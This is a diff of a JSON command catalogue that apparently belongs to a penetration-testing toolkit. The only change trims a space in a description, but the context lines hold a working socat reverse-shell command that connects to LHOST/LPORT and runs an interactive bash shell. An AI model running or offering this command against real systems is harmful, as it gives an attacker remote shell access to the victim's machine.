@@ -24,7 +24,7 @@
 				"qname": "RSScat",
 				"ctext": "socat TCP:{LHOST}:{LPORT} EXEC:\"bash -li\",pty,stderr,sigint,setsid,sane",
 				"parms": ["LHOST","LPORT"],
-                "des": "Can be used to create a reverse shell from a Remote System to a Local system. \nParams:\n\nLHOST: Local System IP \nLPORT: Listening Port"
+                "des": "Can be used to create a reverse shell from a Remote System to a Local system. \nParams:\n\nLHOST: Local System IP\nLPORT: Listening Port"
 			},
             {
 				"lname": "Listener Socat",
